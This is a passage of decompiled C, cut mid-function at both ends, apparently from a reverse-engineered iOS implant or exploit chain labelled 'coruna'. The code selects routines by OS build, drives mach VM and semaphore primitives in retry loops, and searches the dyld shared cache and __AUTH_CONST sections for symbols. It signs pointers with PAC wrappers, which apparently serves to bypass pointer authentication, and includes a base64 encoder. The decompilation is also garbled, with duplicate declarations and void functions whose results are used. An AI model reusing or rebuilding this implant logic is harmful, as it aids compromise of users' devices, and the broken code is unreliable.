  buf[2] = 0xffffffff;
  buf[3] = 0;
  buf[4] = arg;
  scratch[0] = 0;
  handle = 0xd4;
  if (*(int *)(handle + 0x148) != 0x100400) {
    handle = 4;
  }
  coruna_vm_deallocate(buf,buf,0x28,scratch,bootargs,*(uint32_t *)(handle + handle));
  *(uint64_t *)((long)buf + 10) = 0;
  *(uint64_t *)((long)buf + 0x1a) = 0;
  *(uint64_t *)((long)buf + 0x12) = 0;
  buf[4] = 0;
  *buf = (unsigned long)*(ushort *)(handle + 0x122);
  *(uint16_t *)(buf + 1) = 0;
  handle = *(long *)(handle + 0x28);
  str = *(uint64_t **)(handle + 200);
  semaphore = *(semaphore_t *)(handle + 0x18);
  if (flags == 0) {
    *str = 0;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 10;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    *ptr = *buf;
    *(short *)(ptr + 1) = (short)buf[1];
    _semaphore_signal(semaphore);
  }
  else {
    *str = 0x80000000;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 10;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    *ptr = *buf;
    *(short *)(ptr + 1) = (short)buf[1];
    _semaphore_signal(semaphore);
    lk2 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x1c),(mach_timespec_t)0x2);
    if (lk2 == 0x31) {
      return;
    }
  }
  *(long *)(handle + 0x28) = *(long *)(handle + 0x28) + 10;
  _free(buf);
  return;
}
void coruna_implant6dec_via_vm_deallocate_2(long handle)
{
  uint16_t *ptr;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  ptr = _malloc(0x1000);
  *ptr = 0;
  ptr[1] = *(uint16_t *)(handle + 0x140);
  *(uint32_t *)(ptr + 2) = 0;
  *(uint64_t *)(ptr + 4) = 0;
  scratch[0] = 0;
  coruna_vm_deallocate(ptr,ptr,0x10,scratch,bootargs,*(uint32_t *)(handle + 4));
  _free(ptr);
  return;
}
void coruna_implant6dec_via_vm_deallocate_3(long handle)
{
  uint16_t *ptr;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  ptr = _malloc(0x1000);
  *ptr = 0;
  ptr[1] = *(uint16_t *)(handle + 0x142);
  *(uint32_t *)(ptr + 2) = 0;
  *(uint64_t *)(ptr + 4) = 0;
  *(uint64_t *)(ptr + 8) = 0xffffffffffffffff;
  *(uint64_t *)(ptr + 0xc) = 0xffffffffffffffff;
  *(uint64_t *)(ptr + 0x10) = 0;
  *(uint64_t *)(ptr + 0x14) = 0;
  *(uint64_t *)(ptr + 0x18) = 0;
  *(uint8_t *)(ptr + 0x1c) = 0;
  *(uint64_t *)(ptr + 0x20) = 1;
  ptr[0x24] = 0;
  *(uint8_t *)(ptr + 0x25) = 0;
  scratch[0] = 0;
  coruna_vm_deallocate(ptr,ptr,0x4b,scratch,bootargs,*(uint32_t *)(handle + 4));
  _free(ptr);
  return;
}





void coruna_ret_stub_3(long handle)
{
  coruna_implant6dec_via_pacia_3_3(*(uint64_t *)(handle + 0x188));
}





void coruna_ret_stub_4(long handle)
{
  coruna_implant6dec_via_pacia_3_3(*(uint64_t *)(handle + 0x178));
}
void coruna_implant6dec_via_dlerror_2(long handle)
{
  uint32_t u;
  int err;
  long handle;
  
  err = coruna_implant6dec_via_dlerror();
  if ((err == 0) && (err = coruna_implant6dec_via_vm_deallocate_2(handle), u = k_implant_float_const_001, err == 0)) {
    if (*(int *)(handle + 0x148) == 0x100400) {
      coruna_dlerror(handle);
    }
    else {
      err = 5;
      do {
        coruna_dlerror(handle);
        handle = *(long *)(*(long *)(handle + 0x80) + 0x100);
        if (handle != 0 && *(long *)(handle + 0x118) != handle) {
          return;
        }
        coruna_nanosleep(u);
        err = err + -1;
      } while (err != 0);
    }
  }
  return;
}
void coruna_sysctlbyname_f8f8(long handle)
{
  bool err;
  bool status;
  int err;
  size_t scratch [16];
  unsigned long bootargs;
  long thread_attr;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t serial_buf;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t action;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t block_ctx;
  uint64_t region;
  uint64_t plist;
  long stack_guard;
  uint64_t sa_saved;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint32_t sa_new;
  int path_buf;
  uint64_t tmp_buf;
  void (*region)(void);
  void (*plist)(void);
  void (*url_buf)(void);
  void (*json_buf)(void);
  void (*frame)(void);
  void (*work)(void);
  void (*cache)(void);
  long cache_20;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_20;
  long cache_21;
  
  cache_21 = *(long *)k_implant_stack_chk_guard_slot;
  scratch[0xf] = 0;
  bootargs = bootargs & 0xffffffff00000000;
  work = 0;
  cache_20 = 0;
  cache_20 = 0;
  cache = 0;
  scratch[0] = 0x20;
  err = _sysctlbyname("kern.osversion",&cache_20,scratch,(void *)0x0,0);
  if (err == -1) goto fail;
  path_buf = *(int *)(*(long *)(handle + 0x18) + 0xc0);
  cache = coruna_implant6dec_via_semaphore_timedwait_ebbc;
  work = coruna_implant6dec_via_semaphore_timedwait_f060;
  frame = coruna_difftime;
  json_buf = coruna_implant6dec_str_system_library_frameworks_webkit_framework_webk;
  url_buf = coruna_semaphore_timedwait_bf38;
  plist = coruna_semaphore_timedwait;
  region = coruna_implant6dec_via_u64_pack_2;
  if (path_buf - 0x100300U < 2) {
done:
    cache = coruna_implant6dec_via_semaphore_timedwait_ebbc_2;
    work = coruna_sysctlbyname_d1b4;
    frame = coruna_difftime_d064;
    json_buf = coruna_implant6dec_str_system_library_frameworks_webkit_framework_webk_2;
    url_buf = coruna_semaphore_timedwait_cbbc;
    plist = coruna_semaphore_timedwait_c9e4;
    region = coruna_implant6dec_via_vm_deallocate;
    tmp_buf = k_implant_insn_pattern_b;
    if (cache_20 == 0x6532333035433032 && (char)work == '\0') {
cleanup:
      cache = coruna_implant6dec_via_semaphore_timedwait_ebbc_2;
      work = coruna_sysctlbyname_d1b4;
      frame = coruna_difftime_d064;
      json_buf = coruna_implant6dec_str_system_library_frameworks_webkit_framework_webk_2;
      url_buf = coruna_semaphore_timedwait_cbbc;
      plist = coruna_semaphore_timedwait_d5a4;
      region = coruna_implant6dec_via_vm_deallocate;
      tmp_buf = k_implant_insn_pattern_b;
    }
  }
  else {
    tmp_buf = k_implant_insn_pattern_a;
    if (path_buf != 0x100400) {
      if (path_buf == 0x100200) goto done;
      goto cleanup;
    }
  }
  sa_new = 0;
  url_buf = 0;
  sa_saved = 0;
  frame = 0;
  json_buf = 0;
  region = 0;
  block_ctx = 0;
  stack_guard = 0;
  plist = 0;
  sa_new = 0;
  action = 0;
  tmp_buf = 0;
  path_buf = 0;
  block_ctx = 0;
  serial_buf = 0;
  sa_saved = 0;
  stack_guard = 0;
  host_info = 0;
  host_info = 0;
  action = 0;
  serial_buf = 0;
  scratch = 0;
  thread_attr = 0;
  thread_attr = 0;
  bootargs = 0;
  scratch[0xe] = 0;
  scratch[0xd] = 0;
  bootargs = 0;
  scratch[0xf] = 0;
  scratch[10] = 0;
  scratch[9] = 0;
  scratch[0xc] = 0;
  scratch[0xb] = 0;
  scratch[6] = 0;
  scratch[5] = 0;
  scratch[8] = 0;
  scratch[7] = 0;
  scratch[2] = 0;
  scratch[1] = 0;
  scratch[4] = 0;
  scratch[3] = 0;
  err = coruna_implant6dec_via_dlerror_2(scratch + 1);
  if (err == 0) {
    status = true;
    do {
      err = status;
      err = coruna_mach_make_memory_entry_64(scratch + 1);
      if (err == 0) {
        err = coruna_ret_stub_4(scratch + 1,handle);
        if (err == 0) {
          coruna_mach_port_destroy(scratch + 1);
          break;
        }
        coruna_dlerror(scratch + 1);
        if (((bool)((*(long *)(thread_attr + 0x100) == 0 || stack_guard == *(long *)(thread_attr + 0x100))
                   & err)) && (err = coruna_implant6dec_via_dlerror_2(scratch + 1), err != 0)) break;
      }
      coruna_mach_port_destroy(scratch + 1);
      status = false;
    } while (err);
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot != cache_21) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_call_sysctlbyname_f8f8(void)
{
  coruna_sysctlbyname_f8f8();
  return;
}
void coruna_implant6dec_via_task_info_fd84(char *path)
{
  int err;
  long handle;
  long addr;
  long off;
  uint *ptr;
  
  handle = coruna_task_info();
  addr = *(long *)(handle + 0x90);
  if (addr != 0) {
    off = 0;
    ptr = (uint *)((unsigned long)*(uint *)(handle + 0x1c0) + handle + 0x18);
    do {
      err = _strcmp(path,(char *)(handle + (unsigned long)*ptr));
      if (err == 0) {
        coruna_task_info_fd84();
        return;
      }
      off = off + 1;
      ptr = ptr + 8;
    } while (addr != off);
  }
  return;
}
void coruna_task_info(void)
{
  integer_t scratch [6];
  
  scratch[5] = 5;
  scratch[0] = 0;
  scratch[1] = 0;
  scratch[2] = 0;
  scratch[3] = 0;
  scratch[4] = 0;
  _task_info(*(task_name_t *)k_implant_mach_task_self_slot,0x11,scratch,
             (mach_msg_type_number_t *)(scratch + 5));
  return;
}
void coruna_task_info_fd84(void)
{
  integer_t scratch [6];
  
  scratch[5] = 5;
  scratch[0] = 0;
  scratch[1] = 0;
  scratch[2] = 0;
  scratch[3] = 0;
  scratch[4] = 0;
  _task_info(*(task_name_t *)k_implant_mach_task_self_slot,0x11,scratch,
             (mach_msg_type_number_t *)(scratch + 5));
  return;
}
void coruna_implant6dec_residual_90(int *flags,char *path,char *str_2,uint64_t *val,uint64_t *id_2)
{
  char *ptr;
  int err;
  uint u;
  int status;
  int flags;
  long handle;
  
  if ((*flags == -0x1120531) && (err = flags[4], err != 0)) {
    flags = 0;
    flags = flags + 8;
    do {
      if (((*flags == 0x19) && (status = _strcmp((char *)(flags + 2),path), status == 0)) &&
         (u = flags[0x10], u != 0)) {
        handle = 0;
        do {
          ptr = (char *)((long)flags + handle + 0x48);
          status = _strcmp(ptr,str_2);
          if (status == 0) {
            *val = flags;
            *id_2 = ptr;
            return;
          }
          handle = handle + 0x50;
        } while ((unsigned long)u * 0x50 - handle != 0);
      }
      flags = (int *)((long)flags + (unsigned long)(uint)flags[1]);
      flags = flags + 1;
    } while (flags != err);
  }
  return;
}
void coruna_getsectdatafromframework(char *path,char *str_2,char *name_3,uint64_t *val)
{
  long handle;
  int err;
  char *ptr;
  uint64_t u;
  long addr;
  long off;
  long scratch [3];
  
  ptr = _getsectdatafromFramework(path,str_2,name_3,(unsigned long *)(scratch + 2));
  if (ptr == (char *)0x0) {
    u = coruna_implant6dec_via_task_info_fd84(path);
    scratch[0] = 0;
    scratch[1] = 0;
    err = coruna_implant6dec_residual_90(u,str_2,name_3,scratch + 1,scratch);
    handle = scratch[0];
    ptr = (char *)0x0;
    if (err != 0) {
      off = *(long *)(scratch[0] + 0x20);
      addr = __dyld_get_image_slide(u);
      ptr = (char *)(addr + off);
      scratch[2] = *(uint64_t *)(handle + 0x28);
    }
  }
  if ((ptr != (char *)0x0) && (val != (uint64_t *)0x0)) {
    *val = scratch[2];
  }
  return;
}
void coruna_dyld_shared_cache_file_path(char *path,char *str_2)
{
  uint64_t u;
  uint64_t size;
  char *ptr;
  uint64_t version;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t *serial_buf;
  char *action;
  uint64_t block_ctx;
  uint64_t *stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint8_t *path_buf;
  uint64_t tmp_buf;
  void (*region)(void);
  uint8_t *plist;
  uint64_t url_buf;
  uint64_t *json_buf;
  char *frame;
  uint64_t work;
  uint64_t *cache;
  uint64_t cache_20;
  uint8_t cache_21;
  char cache_22 [1024];
  long cache_23;
  
  u = k_implant_map_flags_b;
  version = k_implant_map_flags_a;
  cache_23 = *(long *)k_implant_stack_chk_guard_slot;
  if (((path != (char *)0x0) && (*path != '\0' && str_2 != (char *)0x0)) &&
     (*str_2 != '\0')) {
    serial_buf = &block_ctx;
    block_ctx = 0;
    sa_saved = k_implant_map_flags_a;
    sa_new = 0;
    scratch = k_implant_nsconcretestackblock_slot;
    bootargs = k_implant_map_flags_b;
    thread_attr = coruna_dyld_image_local_nlist_content_4symbolication;
    host_info = &k_implant_slot_d;
    action = str_2;
    stack_guard = serial_buf;
    size = coruna_implant6dec_via_pacia_3_2(&scratch);
    cache = &work;
    work = 0;
    cache_20 = version;
    cache_21 = 0;
    ptr = (char *)_dyld_shared_cache_file_path();
    if (ptr != (char *)0x0) {
      _bzero(cache_22,0x400);
      _strncpy(cache_22,ptr,0x400);
      if (cache_22[0] != '\0') {
        path_buf = k_implant_nsconcretestackblock_slot;
        tmp_buf = u;
        region = coruna_dyld_shared_cache_for_each_image;
        plist = &k_implant_slot_f;
        json_buf = &work;
        url_buf = size;
        frame = path;
        version = coruna_implant6dec_via_pacia_3_2(&path_buf);
        _dyld_shared_cache_for_file(cache_22,version);
      }
    }
    __Block_object_dispose(&work,8);
    __Block_object_dispose(&block_ctx,8);
  }
  if (*(long *)k_implant_stack_chk_guard_slot != cache_23) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_dyld_image_local_nlist_content_4symbolication(long handle,uint64_t val)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t scratch;
  
  scratch = k_implant_nsconcretestackblock_slot;
  bootargs = k_implant_map_flags_b;
  thread_attr = coruna_macho_text_seg;
  host_info = &k_implant_slot_c;
  serial_buf = *(uint64_t *)(handle + 0x20);
  action = *(uint64_t *)(handle + 0x28);
  scratch = val;
  u = coruna_implant6dec_via_pacia_3_2(&scratch);
  _dyld_image_local_nlist_content_4Symbolication(val,u);
  return;
}
void coruna_macho_text_seg(long handle,uint *size,unsigned long arg,long addr_2)
{
  int err;
  uint64_t u;
  uint64_t size;
  unsigned long version;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t serial_buf;
  uint *action;
  
  if (arg != 0) {
    version = 0;
    do {
      if ((addr_2 != 0) &&
         (err = _strcmp((char *)(addr_2 + (unsigned long)*size),*(char **)(handle + 0x28)),
         err == 0)) {
        size = *(uint64_t *)(handle + 0x30);
        scratch = k_implant_nsconcretestackblock_slot;
        bootargs = k_implant_map_flags_b;
        thread_attr = coruna_implant6dec_residual_91;
        host_info = &k_implant_slot_b;
        serial_buf = *(uint64_t *)(handle + 0x20);
        action = size;
        u = coruna_implant6dec_via_pacia_3_2(&scratch);
        _dyld_image_content_for_segment(size,"__TEXT",u);
        return;
      }
      version = version + 1;
      size = size + 4;
    } while (version < arg);
  }
  return;
}
void coruna_implant6dec_residual_91(long handle,long addr_2,long off_3)
{
  *(long *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) =
       addr_2 + (*(long *)(*(long *)(handle + 0x28) + 8) - off_3);
  return;
}
void coruna_block_assign_10398(long handle,long addr_2)
{
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),8);
  return;
}
void coruna_block_dispose_103dc(long handle)
{
  __Block_object_dispose(*(void **)(handle + 0x20),8);
  return;
}
void coruna_dlclose_1041c(uint64_t val,uint64_t id_2)
{
  uint64_t *******lpppppppu1;
  bool err;
  long handle;
  string *lps4;
  long addr;
  long off;
  void *scratch [2];
  char bootargs;
  string *thread_attr;
  string *host_info;
  string *serial_buf;
  uint64_t *******action [2];
  char block_ctx;
  string stack_guard [23];
  char sa_saved;
  long sa_new;
  
  sa_new = *(long *)k_implant_stack_chk_guard_slot;
  handle = coruna_dyld_shared_cache_file_path();
  if ((handle == 0) && (handle = _dlopen(val,1), handle != 0)) {
    coruna_implant6dec_via_abort_10de8(action,id_2);
    coruna_implant6dec_via_abort_10de8(scratch,id_2);
    lps4 = (string *)std_string_erase((unsigned long)scratch,0);
    std_string_string(stack_guard,lps4);
    lps4 = operator_new(0x30);
    serial_buf = lps4 + 0x30;
    addr = 0;
    thread_attr = lps4;
    do {
      off = addr;
      std_string_string(lps4 + off,(string *)((long)action + off));
      addr = off + 0x18;
    } while (off + 0x18 != 0x30);
    addr = 0;
    host_info = lps4 + 0x30;
    do {
      if ((&sa_saved)[addr] < '\0') {
        operator_delete(*(void **)(stack_guard + addr));
      }
      addr = addr + -0x18;
    } while (addr != -0x30);
    if (bootargs < '\0') {
      operator_delete(scratch[0]);
    }
    do {
      std_string_string((string *)action,lps4);
      lpppppppu1 = action[0];
      if (-1 < block_ctx) {
        lpppppppu1 = action;
      }
      addr = _dlsym(handle,lpppppppu1);
      if (block_ctx < '\0') {
        operator_delete(action[0]);
      }
      lps4 = lps4 + 0x18;
      err = off != 0;
      off = off + -0x18;
    } while (addr == 0 && err);
    _dlclose(handle);
    coruna_implant6dec_residual_92(&thread_attr);
  }
  if (*(long *)k_implant_stack_chk_guard_slot != sa_new) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_implant6dec_via_abort_10de8(uint64_t *val,char *path)
{
  size_t ls1;
  uint64_t *ptr;
  unsigned long u;
  
  ls1 = _strlen(path);
  if (0xffffffffffffffef < ls1) {
    coruna_abort_10de8();
  }
  if (ls1 < 0x17) {
    *(char *)((long)val + 0x17) = (char)ls1;
    ptr = val;
    if (ls1 == 0) goto fail;
  }
  else {
    u = ls1 + 0x10 & 0xfffffffffffffff0;
    ptr = operator_new(u);
    val[1] = ls1;
    val[2] = u | 0x8000000000000000;
    *val = ptr;
  }
  _memcpy(ptr,path,ls1);
  val = ptr;
fail:
  *(uint8_t *)((long)val + ls1) = 0;
  return;
}
void coruna_implant6dec_str_auth_const(uint64_t val,long handle)
{
  bool err;
  uint8_t *ptr;
  uint8_t *buf;
  uint8_t *str;
  bool status;
  uint64_t *copy;
  uint64_t *data;
  long handle;
  long *ptr;
  long addr;
  char *ptr;
  long off;
  long base;
  long scratch;
  long *bootargs;
  long *thread_attr;
  uint64_t host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_implant_stack_chk_guard_slot;
  copy = operator_new(0x28);
  str = PTR_s___DATA_CONST_00014938;
  buf = PTR_s___DATA_00014930;
  ptr = PTR_s___AUTH_CONST_00014920;
  copy[1] = PTR_s___AUTH_00014928;
  *copy = ptr;
  copy[3] = str;
  copy[2] = buf;
  copy[4] = PTR_s___DATA_DIRTY_00014940;
  bootargs = (long *)0x13ee7;
  thread_attr = (long *)0x13eef;
  data = operator_new(0x10);
  base = 0;
  data[1] = thread_attr;
  *data = bootargs;
  ptr = "__AUTH_CONST";
  do {
    off = 0;
    addr = 0xffff1102888122;
    do {
      handle = coruna_getsectdatafromframework(val,ptr,data[off],&scratch);
      if (handle != 0) {
        bootargs = (long *)0x0;
        thread_attr = (long *)0x0;
        host_info = 0;
        coruna_implant6dec_via_abort_10f6c(&bootargs,0,handle,handle + scratch * 8);
        ptr = bootargs;
        if (bootargs == thread_attr) {
fail:
          status = ptr == thread_attr;
          err = !status;
          if (!status) {
            addr = (long)ptr + (handle - (long)bootargs);
          }
        }
        else {
          do {
            if (handle == *ptr) goto fail;
            ptr = ptr + 1;
          } while (ptr != thread_attr);
          err = false;
          status = true;
        }
        if (bootargs != (long *)0x0) {
          thread_attr = bootargs;
          operator_delete(bootargs);
        }
        if ((err) && (!status)) break;
      }
      off = off + 1;
    } while (off != 2);
    if ((addr != 0xffff1102888122) || (base = base + 1, base == 5)) {
      operator_delete(data);
      operator_delete(copy);
      if (*(long *)k_implant_stack_chk_guard_slot == serial_buf) {
        return;
      }
      ___stack_chk_fail();
    }
    ptr = (char *)copy[base];
  } while( true );
}
void coruna_implant6dec_via_abort_10f6c(long *handle,void *ctx,void *scratch,void *data_3)
{
  unsigned long u;
  void *ptr;
  uint64_t *ptr;
  uint64_t *buf;
  long handle;
  uint64_t *str;
  uint64_t *copy;
  unsigned long size;
  unsigned long version;
  long addr;
  size_t ls11;
  long off;
  void *scratch;
  void *bootargs;
  void *thread_attr;
  void *host_info;
  long *serial_buf;
  
  version = (long)data_3 - (long)scratch;
  if (0 < (long)version) {
    off = (long)version >> 3;
    ptr = (uint64_t *)handle[1];
    if (handle[2] - (long)ptr >> 3 < off) {
      addr = *handle;
      u = off + ((long)ptr - addr >> 3);
      if (u >> 0x3d != 0) {
        coruna_abort_10f6c();
fail:
        coruna_abort_10df4();
      }
      serial_buf = handle + 2;
      handle = handle[2] - addr;
      size = handle >> 2;
      if (u <= size) {
        u = size;
      }
      if (0xffffffffffffffe < (unsigned long)(handle >> 3)) {
        u = 0x1fffffffffffffff;
      }
      if (u == 0) {
        scratch = (void *)0x0;
      }
      else {
        if (u >> 0x3d != 0) goto fail;
        scratch = operator_new(u << 3);
      }
      ptr = (void *)((long)scratch + ((long)ctx - addr >> 3) * 8);
      host_info = (void *)((long)scratch + u * 8);
      bootargs = ptr;
      _memcpy(ptr,scratch,version & 0xfffffffffffffff8);
      thread_attr = (void *)((long)ptr + off * 8);
      coruna_helper_14e24_10e94(handle,&scratch,ctx);
      if ((long)thread_attr - (long)bootargs != 0) {
        thread_attr = (void *)((long)thread_attr +
                           (((long)thread_attr - (long)bootargs) - 8U >> 3 ^ 0xffffffffffffffff) * 8);
      }
      if (scratch != (void *)0x0) {
        operator_delete(scratch);
      }
    }
    else {
      addr = (long)ptr - (long)ctx >> 3;
      str = ptr;
      if (addr < off) {
        ptr = (void *)((long)scratch + addr * 8);
        ls11 = (long)data_3 - (long)ptr;
        if (0 < (long)ls11) {
          _memcpy(ptr,ptr,ls11);
          str = (uint64_t *)((long)ptr + ls11);
        }
        handle[1] = (long)str;
        data_3 = ptr;
        if ((long)ptr - (long)ctx < 1) {
          return;
        }
      }
      ls11 = (long)str - (long)((long)ctx + off * 8);
      buf = str;
      for (copy = str + -off; copy < ptr; copy = copy + 1) {
        *buf = *copy;
        buf = buf + 1;
      }
      handle[1] = (long)buf;
      if (ls11 != 0) {
        _memmove(str + -((long)ls11 >> 3),ctx,ls11);
      }
      if ((long)data_3 - (long)scratch != 0) {
        _memmove(ctx,scratch,(long)data_3 - (long)scratch);
      }
    }
  }
  return;
}
void coruna_implant6dec_via_implant6dec_str_auth_const(uint64_t val)
{
  long handle;
  
  handle = coruna_dlclose_1041c();
  if (handle != 0) {
    coruna_implant6dec_str_auth_const(val,handle);
  }
  return;
}
void coruna_implant6dec_via_implant6dec_via_implant6dec_str_auth_const(void)
{
  coruna_implant6dec_via_implant6dec_str_auth_const();
  return;
}
void coruna_sel_registername(uint64_t val,uint64_t id_2)
{
  _sel_registerName(id_2);
  return;
}
void coruna_dyld_shared_cache_for_each_image(long handle,uint64_t val)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t serial_buf;
  uint64_t scratch;
  uint64_t action;
  
  scratch = k_implant_nsconcretestackblock_slot;
  bootargs = k_implant_map_flags_b;
  thread_attr = coruna_dyld_image_get_installname;
  host_info = &k_implant_slot_e;
  action = *(uint64_t *)(handle + 0x30);
  scratch = *(uint64_t *)(handle + 0x28);
  serial_buf = *(uint64_t *)(handle + 0x20);
  u = coruna_implant6dec_via_pacia_3_2(&scratch);
  _dyld_shared_cache_for_each_image(val,u);
  return;
}
void coruna_dyld_image_get_installname(long handle,uint64_t val)
{
  int err;
  char *ptr;
  
  if (((*(char *)(*(long *)(*(long *)(handle + 0x28) + 8) + 0x18) == '\0') &&
      (ptr = (char *)_dyld_image_get_installname(val), ptr != (char *)0x0)) &&
     (err = _strcmp(ptr,*(char **)(handle + 0x30)), err == 0)) {
    coruna_implant6dec_via_pacia_3_3(*(uint64_t *)(handle + 0x20),val);
  }
  return;
}
void coruna_block_assign_10d2c(long handle,long addr_2)
{
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),7);
  __Block_object_assign((void *)(handle + 0x28),*(void **)(addr_2 + 0x28),8);
  return;
}
void coruna_block_dispose_10d90(long handle)
{
  __Block_object_dispose(*(void **)(handle + 0x28),8);
  __Block_object_dispose(*(void **)(handle + 0x20),7);
  return;
}





void coruna_abort_10de8(void)
{
  _abort();
}





void coruna_abort_10df4(void)
{
  _abort();
}
void coruna_implant6dec_residual_92(uint64_t *val)
{
  void *ptr;
  void *buf;
  void *str;
  
  str = (void *)*val;
  if (str != (void *)0x0) {
    buf = (void *)val[1];
    ptr = str;
    if (buf != str) {
      do {
        buf = (void *)((long)buf + -0x18);
      } while (buf != str);
      ptr = (void *)*val;
    }
    val[1] = str;
    operator_delete(ptr);
  }
  return;
}
void coruna_helper_14e24_10e94(uint64_t *val,uint64_t *id_2,uint64_t *size_3)
{
  void *ptr;
  size_t ls2;
  uint64_t *ptr;
  uint64_t u;
  uint64_t *buf;
  long handle;
  uint64_t *str;
  
  handle = id_2[1];
  ptr = (void *)*val;
  ls2 = (long)size_3 - (long)ptr;
  id_2[1] = (void *)(handle - ls2);
  if (0 < (long)ls2) {
    _memcpy((void *)(handle - ls2),ptr,ls2);
  }
  ptr = (uint64_t *)val[1];
  if (ptr != size_3) {
    buf = (uint64_t *)id_2[2];
    do {
      str = size_3 + 1;
      *buf = *size_3;
      buf = (uint64_t *)(id_2[2] + 8);
      id_2[2] = buf;
      size_3 = str;
    } while (str != ptr);
  }
  u = *val;
  *val = id_2[1];
  id_2[1] = u;
  u = val[1];
  val[1] = id_2[2];
  id_2[2] = u;
  u = val[2];
  val[2] = id_2[3];
  id_2[3] = u;
  *id_2 = id_2[1];
  return;
}





void coruna_abort_10f6c(void)
{
  _abort();
}
void coruna_implant6dec_residual_93(long handle,int flags)
{
  if (0xbd81a989 < handle - 1U) {
    return;
  }
  if (flags == 2) {
    return;
  }
  if (flags != 1) {
    return;
  }
  return;
}
void coruna_implant6dec_residual_94(unsigned long *arg,long *handle,int flags,int count_2)
{
  bool err;
  uint8_t *ptr;
  unsigned long u;
  int err;
  unsigned long size;
  uint version;
  unsigned long port;
  byte *ptr;
  int status;
  uint tag;
  unsigned long kind;
  long handle;
  unsigned long type_id;
  
  ptr = &UNK_00012bb0;
  if (count_2 != 1) {
    ptr = &k_implant_macho_header_tag;
  }
  err = 0x4c < (unsigned long)(handle[1] - *handle);
  port = *arg;
  u = arg[1] - port;
  if (u < 2 || arg[1] - 2 == port) {
    size = 0;
    version = 0;
    tag = 0;
  }
  else {
    type_id = 0;
    version = 0;
    size = 0;
    kind = 1;
    do {
      if (flags == 1 && err) {
        if ((version != 0) && (version % 0x4c == 0)) {
          *(uint8_t *)(*handle + size) = 10;
          size = (unsigned long)((int)size + 1);
          port = *arg;
        }
        version = version + 4;
      }
      *(uint8_t *)(*handle + size) = ptr[*(byte *)(port + type_id) >> 2];
      err = (int)size;
      *(uint8_t *)(*handle + (unsigned long)(err + 1)) =
           ptr[((unsigned long)*(byte *)(*arg + type_id) & 3) << 4 |
                  (unsigned long)(*(byte *)(*arg + kind) >> 4)];
      status = (int)kind;
      *(uint8_t *)(*handle + (unsigned long)(err + 2)) =
           ptr[((unsigned long)*(byte *)(*arg + kind) & 0xf) << 2 |
                  (unsigned long)(*(byte *)(*arg + (unsigned long)(status + 1U)) >> 6)];
      size = (unsigned long)(err + 4);
      *(uint8_t *)(*handle + (unsigned long)(err + 3)) =
           ptr[(unsigned long)*(byte *)(*arg + (unsigned long)(status + 1U)) & 0x3f];
      type_id = (unsigned long)(status + 2);
      port = *arg;
      u = arg[1] - port;
      kind = (unsigned long)(status + 3);
    } while (type_id < u - 2);
    tag = status + 2;
  }
  if (tag < u) {
    u = (unsigned long)tag;
    if (((flags == 1 && err) && version != 0) && version % 0x4c == 0) {
      *(uint8_t *)(*handle + size) = 10;
      size = (unsigned long)((int)size + 1);
      port = *arg;
    }
    *(uint8_t *)(*handle + size) = ptr[*(byte *)(port + u) >> 2];
    err = (int)size;
    version = err + 1;
    port = *arg;
    if (u < ~port + arg[1]) {
      *(uint8_t *)(*handle + (unsigned long)version) =
           ptr[((unsigned long)*(byte *)(port + u) & 3) << 4 |
                  (unsigned long)(*(byte *)(port + (tag + 1)) >> 4)];
      version = err + 2;
      ptr = (byte *)(*arg + (unsigned long)(tag + 1));
      status = 3;
      port = 0x3c;
      handle = 2;
    }
    else {
      ptr = (byte *)(port + u);
      status = 2;
      port = 0x30;
      handle = 4;
    }
    size = (unsigned long)(uint)(err + status);
    *(uint8_t *)(*handle + (unsigned long)version) = ptr[(unsigned long)*ptr << handle & port];
  }
  handle = *handle;
  if (size < (unsigned long)(handle[1] - handle)) {
    version = (uint)size;
    do {
      version = version + 1;
      *(uint8_t *)(handle + size) = 0x3d;
      size = (unsigned long)version;
      handle = *handle;
    } while ((unsigned long)version < (unsigned long)(handle[1] - handle));
  }
  return;
}
void coruna_implant6dec_via_pacia_3(void)
{
  coruna_pacia_3();
  return;
}
void coruna_implant6dec_via_pacia_3_2(uint64_t *val)
{
  uint64_t u;
  void *ptr;
  void *buf;
  uint64_t *ptr;
  size_t ls5;
  
  if (val != (uint64_t *)0x0) {
    u = coruna_pacia_5(*val,(unsigned long)val | 0x6ae1000000000000);
    *val = u;
    ptr = val + 2;
    u = coruna_pacia_3(*ptr,ptr);
    *ptr = u;
    buf = (void *)val[3];
    if (buf != (void *)0x0) {
      ls5 = *(size_t *)((long)buf + 8);
      ptr = _malloc(ls5);
      if (ptr != (void *)0x0) {
        _memcpy(ptr,buf,ls5);
        ptr = (uint64_t *)((long)ptr + 0x10);
        u = coruna_pacia_3(*ptr,ptr);
        *ptr = u;
